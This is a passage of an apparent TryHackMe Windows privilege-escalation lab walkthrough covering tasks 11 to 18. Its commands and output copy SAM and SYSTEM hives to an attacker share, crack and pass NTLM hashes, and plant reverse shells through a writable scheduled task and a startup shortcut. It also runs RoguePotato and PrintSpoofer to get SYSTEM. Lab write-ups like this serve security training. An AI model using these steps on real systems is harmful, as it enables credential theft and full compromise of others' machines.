C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin

C:\Windows\system32>exit
exit
```

---------------------------------------------------------------------------------------

### Task 11: Passwords - Security Account Manager (SAM)

The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the `C:\Windows\Repair\` directory.

Transfer the SAM and SYSTEM files to your Kali VM:

`copy C:\Windows\Repair\SAM \\10.10.10.10\kali\`  
`copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\`

On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:

`git clone https://github.com/Tib3rius/creddump7`  
`pip3 install pycrypto`  
`python3 creddump7/pwdump.py SYSTEM SAM`

Crack the admin NTLM hash using hashcat:

`hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`

You can use the cracked password to log in as the admin using winexe or RDP.

---------------------------------------------------------------------------------------

#### What is the NTLM hash of the admin user?

Hint: The hashdump includes the LM and NTLM hashes. The NTLM hash is the second one!

Make sure there is an SMB share on Kali

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed

```

Check for backups of the registry and copy the hives

```bat
C:\PrivEsc>cd C:\Windows\Repair

C:\Windows\Repair> dir
 Volume in drive C has no label.
 Volume Serial Number is 54A8-AA62

 Directory of C:\Windows\Repair

06/05/2020  07:36 AM    <DIR>          .
06/05/2020  07:36 AM    <DIR>          ..
02/14/2026  07:45 AM            65,536 SAM
02/14/2026  07:45 AM        18,599,936 SYSTEM
               2 File(s)     18,665,472 bytes
               2 Dir(s)  31,261,569,024 bytes free

C:\Windows\Repair> copy SAM \\192.168.144.77\kali\
        1 file(s) copied.

C:\Windows\Repair> copy SYSTEM \\192.168.144.77\kali\
        1 file(s) copied.

C:\Windows\Repair>
```

Now we can extract the hashes at the Kali machine

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ /usr/share/creddump7/pwdump.py -h
usage: /usr/share/creddump7/pwdump.py <system hive> <SAM hive>

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ /usr/share/creddump7/pwdump.py SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
```

Crack the hash with hashcat

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ hashcat -m 1000 a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz, 2913/5890 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

a9fdfa038c4b75ebc76dc855dd74f0da:password123              
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: a9fdfa038c4b75ebc76dc855dd74f0da
Time.Started.....: Sat Feb 14 17:16:49 2026 (2 secs)
Time.Estimated...: Sat Feb 14 17:16:51 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    83858 H/s (0.14ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> oooooo
Hardware.Mon.#1..: Util:  7%

Started: Sat Feb 14 17:16:41 2026
Stopped: Sat Feb 14 17:16:52 2026
```

Answer: `a9fdfa038c4b75ebc76dc855dd74f0da`

---------------------------------------------------------------------------------------

### Task 12: Passwords - Passing the Hash

Why crack a password hash when you can authenticate using the hash?

Use the full admin hash with `pth-winexe` to spawn a shell running as admin without needing to crack their password.  
Remember the full hash includes both the LM and NTLM hash, separated by a colon:

`pth-winexe -U 'admin%hash' //10.66.131.162 cmd.exe`

---------------------------------------------------------------------------------------

#### Read and follow along with the above

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.66.131.162 cmd.exe
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin

C:\Windows\system32>exit
exit
```

---------------------------------------------------------------------------------------

### Task 13: Scheduled Tasks

View the contents of the `C:\DevTools\CleanUp.ps1` script:

`type C:\DevTools\CleanUp.ps1`

The script seems to be running as SYSTEM every minute. Using **accesschk.exe**, note that you have the ability to write to this file:

`C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`

Start a listener on Kali and then append a line to the `C:\DevTools\CleanUp.ps1` which runs the reverse.exe executable you created:

`echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`

Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.

---------------------------------------------------------------------------------------

#### Read and follow along with the above

Analyse the script

```bat
C:\PrivEsc> type C:\DevTools\CleanUp.ps1
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log

C:\PrivEsc> C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
RW C:\DevTools\CleanUp.ps1
        FILE_ADD_FILE
        FILE_ADD_SUBDIRECTORY
        FILE_APPEND_DATA
        FILE_EXECUTE
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        DELETE
        SYNCHRONIZE
        READ_CONTROL

C:\PrivEsc>
```

Start a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345                                                                            
listening on [any] 12345 ...

```

Append the reverse shell to the script

```bat
C:\PrivEsc>echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

C:\PrivEsc>
```

Wait for the scheduled task to run and check the netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345                                                                            
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.66.131.162] 50107
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>exit
exit
```

---------------------------------------------------------------------------------------

### Task 14: Insecure GUI Apps

Start an RDP session as the "user" account:

`rdesktop -u user -p password321 10.66.131.162`

Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:

`tasklist /V | findstr mspaint.exe`

In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: `file://c:/windows/system32/cmd.exe`

Press `Enter` to spawn a command prompt running with admin privileges.

---------------------------------------------------------------------------------------

#### Read and follow along with the above

Check the process

```bat
C:\PrivEsc>tasklist /V | findstr mspaint.exe
mspaint.exe                   5092 RDP-Tcp#0                  2     32,452 K Running         WIN-QBA94KB3IOF\admin                                   0:00:00 Untitled - Paint

C:\PrivEsc>
```

Open a file, paste `file://c:/windows/system32/cmd.exe` and press `Enter`.

![Shell as Admin](Images/Shell_as_Admin.png)

---------------------------------------------------------------------------------------

### Task 15: Startup Apps

Using **accesschk.exe**, note that the BUILTIN\Users group can write files to the StartUp directory:

`C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`

Using cscript, run the `C:\PrivEsc\CreateShortcut.vbs` script which should create a new shortcut to your `reverse.exe` executable in the StartUp directory:

`cscript C:\PrivEsc\CreateShortcut.vbs`

Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:

`rdesktop -u admin 10.66.131.162`

A shell running as admin should connect back to your listener.

---------------------------------------------------------------------------------------

#### Read and follow along with the above

Check the startup directory abd note that it is writable

```bat
C:\PrivEsc>accesschk.exe -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW WIN-QBA94KB3IOF\Administrator
  RW WIN-QBA94KB3IOF\admin
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  R  Everyone

C:\PrivEsc>
```

Create a shortcut in the directory that will launch our reverse shell

```bat
C:\PrivEsc>type CreateShortcut.vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save

C:\PrivEsc>cscript CreateShortcut.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.


C:\PrivEsc>
```

Start a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345                                                                                                 
listening on [any] 12345 ...

```

Login as admin to trigger the reverse shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ rdesktop -u admin 10.66.172.123
Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=WIN-QBA94KB3IOF


Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=WIN-QBA94KB3IOF
     Issuer: CN=WIN-QBA94KB3IOF
 Valid From: Fri Feb 13 17:43:10 2026
         To: Sat Aug 15 18:43:10 2026

  Certificate fingerprints:

       sha1: bfdc89d8ceffc4fa0567db265b25d49ac5ad6fde
     sha256: f02109f8898b0230632eb2b0ac4774b1ba87b6e5cb5da6df040ec51c80069435


Do you trust this certificate (yes/no)? yes
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.
<---snip--->
```

Check the connection at the netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345                                                                                                 
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.66.172.123] 49798
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin

C:\Windows\system32>exit
exit
```

---------------------------------------------------------------------------------------

### Task 16: Token Impersonation - Rogue Potato

Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:

`sudo socat tcp-listen:135,reuseaddr,fork tcp:10.66.172.123:9999`

Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using `PSExec64.exe` to trigger the `reverse.exe` executable you created with the permissions of the "local service" account:

`C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`

Start another listener on Kali.

Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

`C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999`

---------------------------------------------------------------------------------------

#### Name one user privilege that allows this exploit to work

Hint: Read up on the exploit on Google! This privilege relates to impersonation.

From [https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html)

Answer: `SeImpersonatePrivilege`

#### Name the other user privilege that allows this exploit to work

Hint: Read up on the exploit on Google! This privilege relations to tokens.

From [https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html)

Answer: `SeAssignPrimaryTokenPrivilege`

#### Try the exploit

Setup a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.66.172.123:9999
[sudo] password for kali: 

```

Then start a netcat listener to receive a reverse shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345             
listening on [any] 12345 ...

```

Run a **cmd.exe** window as Administrator and start the reverse shell as Local Service

```bat
C:\Windows\system32>C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

```

Check the connection back at the netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345             
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.66.172.123] 49945
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\local service

C:\Windows\system32>
```

Start another netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345          
listening on [any] 12345 ...

```

Back at the first netcat lister, execute the exploit

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345             
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.66.172.123] 49945
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\local service

C:\Windows\system32>C:\PrivEsc\RoguePotato.exe -r 192.168.144.77 -e "C:\PrivEsc\reverse.exe" -l 9999 
C:\PrivEsc\RoguePotato.exe -r 192.168.144.77 -e "C:\PrivEsc\reverse.exe" -l 9999
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written:110 bytes
[*] SecurityCallback RPC call
[*] ServerAlive2 RPC Call
[*] SecurityCallback RPC call
[*] ResolveOxid2 RPC call, this is for us!
[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
[*] Client connected!
[+] Got SYSTEM Token!!!
[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: C:\PrivEsc\reverse.exe
[+] RoguePotato gave you the SYSTEM powerz :D

C:\Windows\system32>
```

Check the second netcat listener for a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.66.172.123] 49979
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>exit
exit
```

---------------------------------------------------------------------------------------

### Task 17: Token Impersonation - PrintSpoofer

Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:

`C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`

Start another listener on Kali.

Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

`C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`

---------------------------------------------------------------------------------------

#### Read and follow along with the above

Start a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...

```

Run a **cmd.exe** window as Administrator and start the reverse shell as Local Service

```bat
C:\Windows\system32>C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

```

Back at the netcat listener, we have a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.66.172.123] 50053
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\local service

C:\Windows\system32>
```

Start another netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...

```

In the first netcat listener, execute the exploit

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.66.172.123] 50053
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\local service

C:\Windows\system32>C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

```

Check the second netcat listener for a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.66.172.123] 50084
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>exit
exit
```

---------------------------------------------------------------------------------------

### Task 18: Privilege Escalation Scripts

Several tools have been written which help find potential privilege escalations on Windows.

Four of these tools have been included on the Windows VM in the `C:\PrivEsc` directory:

- winPEASany.exe
- Seatbelt.exe
- PowerUp.ps1
- SharpUp.exe

---------------------------------------------------------------------------------------

#### Experiment with all four tools, running them with different options. Do all of them identify the techniques used in this room?

**winPEASany.exe** execution:

```bat
C:\PrivEsc>winPEASany.exe
   Creating Dynamic lists, this could take a while, please wait...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list...
   - Creating disabled users list...
   - Admin users list...

             *((,.,/((((((((((((((((((((/,  */
      ,/*,..*((((((((((((((((((((((((((((((((((,
    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*
    ((((((((((((((((**********/########## .(* ,(((((((
    (((((((((((/********************/####### .(. (((((((
    ((((((..******************/@@@@@/***/###### ./(((((((
    ,,....********************@@@@@@@@@@(***,#### .//((((((
    , ,..********************/@@@@@%@@@@/********##((/ /((((
    ..((###########*********/%@@@@@@@@@/************,,..((((
    .(##################(/******/@@@@@/***************.. /((
    .(#########################(/**********************..*((
    .(##############################(/*****************.,(((
    .(###################################(/************..(((
    .(#######################################(*********..(((
    .(#######(,.***.,(###################(..***.*******..(((
    .(#######*(#####((##################((######/(*****..(((
    .(###################(/***********(##############(...(((
    .((#####################/*******(################.((((((
    .(((############################################(..((((
    ..(((##########################################(..(((((
    ....((########################################( .(((((
    ......((####################################( .((((((
    (((((((((#################################(../((((((
        (((((((((/##########################(/..((((((
              (((((((((/,.  ,*//////*,. ./(((((((((((((((.
                 (((((((((((((((((((((((((((((/

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

  WinPEAS vBETA VERSION, Please if you find any issue let me know in https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues by carlospolop

  [+] Leyend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

   [?] You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation


  ==========================================(System Information)==========================================

  [+] Basic System Information(T1082&T1124&T1012&T1497&T1212)
   [?] Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
    Hostname: WIN-QBA94KB3IOF
    ProductName: Windows Server 2019 Standard Evaluation
    EditionID: ServerStandardEval
    ReleaseId: 1809
    BuildBranch: rs5_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 1
    SystemLang: en-US
    KeyboardLang: Swedish (Sweden)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: False
    Current Time: 2/14/2026 9:36:41 AM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB4514366, KB4512577, KB4512578,

  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
    OS Build Number: 17763
       [!] CVE-2019-1315 : VULNERABLE
        [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

       [!] CVE-2019-1385 : VULNERABLE
        [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

       [!] CVE-2019-1388 : VULNERABLE
        [>] https://github.com/jas502n/CVE-2019-1388

       [!] CVE-2019-1405 : VULNERABLE
        [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/

    Finished. Found 4 potential vulnerabilities.

  [+] PowerShell Settings()
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    Transcription Settings:
    Module Logging Settings:
    Scriptblock Logging Settings:

  [+] Audit Settings(T1012)
   [?] Check what is being logged
    Not Found

  [+] WEF Settings(T1012)
   [?] Windows Event Forwarding, is interesting to know were are sent the logs
    Not Found

  [+] LAPS Settings(T1012)
   [?] If installed, local administrator password is changed frequently and is restricted by ACL
    LAPS Enabled: LAPS not installed

  [+] Wdigest()
   [?] If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
    Wdigest is not enabled

  [+] LSA Protection()
   [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
    LSA Protection is not enabled

  [+] Credentials Guard()
   [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled

  [+] Cached Creds()
   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials
    cachedlogonscount is 10

  [+] User Environment Variables()
   [?] Check for some passwords or keys in the env variables
    COMPUTERNAME: WIN-QBA94KB3IOF
    USERPROFILE: C:\Users\user
    HOMEPATH: \Users\user
    LOCALAPPDATA: C:\Users\user\AppData\Local
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp;C:\Users\user\AppData\Local\Microsoft\WindowsApps;
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    LOGONSERVER: \\WIN-QBA94KB3IOF
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    HOMEDRIVE: C:
    SystemRoot: C:\Windows
    SESSIONNAME: RDP-Tcp#0
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    APPDATA: C:\Users\user\AppData\Roaming
    PROCESSOR_REVISION: 4f01
    USERNAME: user
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    CLIENTNAME: kali
    OS: Windows_NT
    USERDOMAIN_ROAMINGPROFILE: WIN-QBA94KB3IOF
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    PROMPT: $P$G
    SystemDrive: C:
    TEMP: C:\Users\user\AppData\Local\Temp\2
    ProgramFiles: C:\Program Files
    NUMBER_OF_PROCESSORS: 1
    TMP: C:\Users\user\AppData\Local\Temp\2
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: WIN-QBA94KB3IOF
    PUBLIC: C:\Users\Public

  [+] System Environment Variables()
   [?] Check for some passwords or keys in the env variables
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 1
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    PROCESSOR_REVISION: 4f01

  [+] HKCU Internet Settings(T1012)
    DisableCachingOfSSLPages: 1
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
